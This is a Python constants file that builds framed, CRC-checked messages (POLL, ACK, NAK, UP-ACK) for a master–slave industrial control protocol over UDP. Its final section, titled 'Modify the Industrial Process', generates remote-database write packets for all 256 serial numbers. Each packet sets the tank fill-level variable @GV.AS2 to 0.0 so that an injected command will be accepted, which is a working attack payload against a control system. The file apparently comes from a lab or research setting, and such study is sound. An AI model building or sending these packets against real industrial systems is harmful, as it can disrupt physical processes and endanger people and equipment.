"""
Define constants to be used

This file defines all constants that will be used elsewhereself.
"""
from PyCRC.CRCCCITT import CRCCCITT

# -------- Constants to run code --------
# When 0 is inputted into terminal as the address,
# that machine will become master
MASTER_ADDRESS = 0

"""
Port used for communication.
Port is the same for both master and slave
"""
UDP_PORT = 1235         # What port communication will use
BUFF_SIZE = 1024        # Used by udpcommunication
# -------------- SAMPLE MESSAGES ----------------

DLE = b'\x10' 			    # Data Link Escape
STX = b'\x02' 			    # Start of Message
ETX = b'\x03' 			    # End of Message
POLL_FUNC = b'\x85' 		# Function code of POLL
ACK_FUNC = b'\x86' 		    # Function code of ACK
ASK_NODATA_FUNC = b'\x87'   # Function code of ACK with no data
NAK_FUNC = b'\x95' 		    # Function code of NACK message
UP_ACK_FUNC = b'\x88'       # Function code for UP_ACK

"""
When 0 is inputted into terminal, that machine
will become master
"""
MASTER_ADDRESS = 0

# Set IP addresses of the master and slave
UDP_IP_MASTER = "172.17.0.3"
UDP_IP_SLAVE = "172.17.0.2"

# Function code of UP_ACK message
SLAVE_ADDR = b'\x01' 		   # Node address of the slave
MASTER_ADDR = b'\x00' 		   # Node address of the master
NODE_STATUS_OK = b'\x00'	   # Node is ok
NODE_STATUS_PANIC = b'\x00'	   # Node is panicking for some reason


# POLL messages
POLL_LIST = list()
# Calculate the CRC values for each address using the PyCRC library.
# This calculate function uses
# the STX, slave address, serial #, function code, message priority, and ETX
POLL_CRC1 = b"".join([STX, SLAVE_ADDR, b'\xFF', POLL_FUNC, b'\x00', ETX])
CALCULATED_CRC1 = CRCCCITT().calculate(POLL_CRC1)
POLL_CRC2 = b"".join([STX, SLAVE_ADDR, b'\xFE', POLL_FUNC, b'\x09', ETX])
CALCULATED_CRC2 = CRCCCITT().calculate(POLL_CRC2)

# Create two POLL messages using the constants defined above.
# The hard coded values represent
# the serial number of the message, the priority of the message.
POLL_LIST.append(b"".join([DLE,
                           STX,
                           SLAVE_ADDR,
                           b'\xFF',
                           POLL_FUNC,
                           b'\x00',
                           DLE,
                           ETX,
                           bytes.fromhex(hex(CALCULATED_CRC1)[2:])]))
POLL_LIST.append(b"".join([DLE,
                           STX,
                           SLAVE_ADDR,
                           b'\xFE',
                           POLL_FUNC,
                           b'\x09',
                           DLE,
                           ETX,
                           bytes.fromhex(hex(CALCULATED_CRC2)[2:])]))
# To get the calculated CRC into the correct format, we need to cast
# it as a hex value, then turn
# that into bytes. We then only grab the index after the first two so
# that we can cut off the 0x


# ACK messages
ACK_LIST = list()

# Calculate the CRC values for the two ACK messages. These CRCs will be
# caluclated with a few more
# values than the POLL messages.
A_CRC1 = b"".join([STX,
                   MASTER_ADDR,
                   b'\xAB',
                   ACK_FUNC,
                   SLAVE_ADDR,
                   NODE_STATUS_OK,
                   b'\x01',
                   ETX])
CALCULATED_CRC3 = CRCCCITT().calculate(A_CRC1)

A_CRC2 = b"".join([STX,
                   MASTER_ADDR,
                   b'\x9C',
                   ACK_FUNC,
                   SLAVE_ADDR,
                   NODE_STATUS_PANIC,
                   b'\x09',
                   ETX])
CALCULATED_CRC4 = CRCCCITT().calculate(A_CRC2)

# Create an ACK message to reply to the POLL messages.
# The hard coded values are again the
# serial number, number of buffers in use, and the CRC
ACK_LIST.append(b"".join([DLE,
                          STX,
                          MASTER_ADDR,
                          b'\xAB',
                          ACK_FUNC,
                          SLAVE_ADDR,
                          NODE_STATUS_OK,
                          b'\x01',
                          DLE,
                          ETX,
                          bytes.fromhex(hex(CALCULATED_CRC3)[2:])]))
ACK_LIST.append(b"".join([DLE,
                          STX,
                          MASTER_ADDR,
                          b'\x9C',
                          ACK_FUNC,
                          SLAVE_ADDR,
                          NODE_STATUS_PANIC,
                          b'\x04',
                          DLE,
                          ETX,
                          bytes.fromhex(hex(CALCULATED_CRC4)[2:])]))


# ASK messages
ASK_NODATA_LIST = list()

# Calculate the CRC values for the two ASK messages.
ASK_RND_CRC1 = b"".join([STX,
                         MASTER_ADDR,
                         b'\x4f',
                         ASK_NODATA_FUNC,
                         SLAVE_ADDR,
                         NODE_STATUS_PANIC,
                         b'\x54',
                         ETX])
CALCULATED_CRC5 = CRCCCITT().calculate(ASK_RND_CRC1)

ASK_RND_CRC2 = b"".join([STX,
                         MASTER_ADDR,
                         b'\x3D',
                         ASK_NODATA_FUNC,
                         SLAVE_ADDR,
                         NODE_STATUS_OK,
                         b'\x33',
                         ETX])
CALCULATED_CRC6 = CRCCCITT().calculate(ASK_RND_CRC2)


ASK_NODATA_LIST.append(b"".join([DLE,
                                 STX,
                                 MASTER_ADDR,
                                 b'\x4F',
                                 ASK_NODATA_FUNC,
                                 SLAVE_ADDR,
                                 NODE_STATUS_PANIC,
                                 b'\x54',
                                 DLE,
                                 ETX,
                                 bytes.fromhex(hex(CALCULATED_CRC5)[2:])]))

ASK_NODATA_LIST.append(b"".join([DLE,
                                 STX,
                                 MASTER_ADDR,
                                 b'\x3D',
                                 ASK_NODATA_FUNC,
                                 SLAVE_ADDR,
                                 NODE_STATUS_OK,
                                 b'\x33',
                                 DLE,
                                 ETX,
                                 bytes.fromhex(hex(CALCULATED_CRC6)[2:])]))


# NAK messages

NAK_LIST = list()

# Calculate the CRC values for the two ASK messages.
NAK_CRC1 = b"".join([STX,
                     MASTER_ADDR,
                     b'\xA2',
                     NAK_FUNC,
                     SLAVE_ADDR,
                     NODE_STATUS_OK,
                     b'\x25',
                     ETX])
CALCULATED_CRC7 = CRCCCITT().calculate(NAK_CRC1)

NAK_CRC2 = b"".join([STX,
                     MASTER_ADDR,
                     b'\x3B',
                     NAK_FUNC,
                     SLAVE_ADDR,
                     NODE_STATUS_OK,
                     b'\x31',
                     ETX])
CALCULATED_CRC8 = CRCCCITT().calculate(NAK_CRC2)

NAK_LIST.append(b"".join([DLE,
                          STX,
                          MASTER_ADDR,
                          b'\xA2',
                          NAK_FUNC,
                          SLAVE_ADDR,
                          NODE_STATUS_OK,
                          b'\x25',
                          DLE,
                          ETX,
                          bytes.fromhex(hex(CALCULATED_CRC7)[2:])]))

NAK_LIST.append(b"".join([DLE,
                          STX,
                          MASTER_ADDR,
                          b'\x3B',
                          NAK_FUNC,
                          SLAVE_ADDR,
                          NODE_STATUS_OK,
                          b'\x31',
                          DLE,
                          ETX,
                          bytes.fromhex(hex(CALCULATED_CRC8)[2:])]))


# UP-ACK
UP_ACK_LIST = list()

# Calculate the CRC values for the two UP-ACK messages.
UP_CRC1 = b"".join([STX,
                    SLAVE_ADDR,
                    b'\x62',
                    UP_ACK_FUNC,
                    b'\x24',
                    ETX])
CALCULATED_CRC9 = CRCCCITT().calculate(UP_CRC1)

UP_CRC2 = b"".join([STX,
                    SLAVE_ADDR,
                    b'\x3B',
                    UP_ACK_FUNC,
                    b'\x5C',
                    ETX])
CALCULATED_CRC10 = CRCCCITT().calculate(UP_CRC2)

UP_ACK_LIST.append(b"".join([DLE,
                             STX,
                             SLAVE_ADDR,
                             b'\x62',
                             UP_ACK_FUNC,
                             b'\x24',
                             DLE,
                             ETX,
                             bytes.fromhex(hex(CALCULATED_CRC9)[2:])]))

UP_ACK_LIST.append(b"".join([DLE,
                             STX,
                             SLAVE_ADDR,
                             b'\x3B',
                             UP_ACK_FUNC,
                             b'\x5C',
                             DLE,
                             ETX,
                             bytes.fromhex(hex(CALCULATED_CRC10)[2:])]))

"""
Modify the Industrial Process

Modifying the process is difficult. Here we are sending a 0.0 to the variable
that controls what level the tanks are filling to. We are doing so by sending
an RDB (remote database) Write to a variable with a given name, AS2 in this
case.
"""
STOP_LIST = list()


for x in range(0, 256):
    y = bytes([x])

    test = b"".join([b'\x10',   # DLE
                     b'\x02',   # STX
                     b'\x01',   # SLAVE ADDRESS
                     y,         # Serial Number
                     b'\xa0',   # Function code (RDB)
                     b'\xaf',   # Application Sequence number
                     b'\x00',   # Source Function Code
                     b'\x03',   # Node Status Byte
                     b'\x00',   # NULL
                     b'\x84',   # RDB Function Code
                     b'\x0f',   # Security Level
                     b'\x01',   # Element Count
                     b'\x40',   # Start of Name (@)
                     b'\x47',   # G
                     b'\x56',   # V
                     b'\x2e',   # .
                     b'\x41',   # A
                     b'\x53',   # S
                     b'\x32',   # 2
                     b'\x2e',   # .
                     b'\x00',   # ASCII Null for end of name
                     b'\x0b',   # Write Field Descriptor
                     b'\x00',   # Start of little-endian Float 0
                     b'\x00',
                     b'\x00',
                     b'\x00',   # End of Float 0
                     b'\x10',   # DLE
                     b'\x03'    # ETX (End Transmission)
                     ])

    testCRC = CRCCCITT().calculate(test)
    try:
        bCRC = bytes.fromhex(hex(testCRC)[2:])

        test = b"".join([b'\x10',   # DLE
                         b'\x02',   # STX
                         b'\x01',   # SLAVE ADDRESS
                         y,         # Serial Number
                         b'\xa0',   # Function code (RDB)
                         b'\xaf',   # Application Sequence number
                         b'\x00',   # Source Function Code
                         b'\x03',   # Node Status Byte
                         b'\x00',   # NULL
                         b'\x84',   # RDB Function Code
                         b'\x0f',   # Security Level
                         b'\x01',   # Element Count
                         b'\x40',   # Start of Name (@)
                         b'\x47',   # G
                         b'\x56',   # V
                         b'\x2e',   # .
                         b'\x41',   # A
                         b'\x53',   # S
                         b'\x32',   # 2
                         b'\x2e',   # .
                         b'\x00',   # ASCII Null for end of name
                         b'\x0b',   # Write Field Descriptor
                         b'\x00',   # Start of little-endian Float 0
                         b'\x00',
                         b'\x00',
                         b'\x00',   # End of Float 0
                         b'\x10',   # DLE
                         b'\x03',   # ETX (End Transmission)
                         bCRC       # CRC
                         ])

        STOP_LIST.append(test)
    except ValueError:
        pass
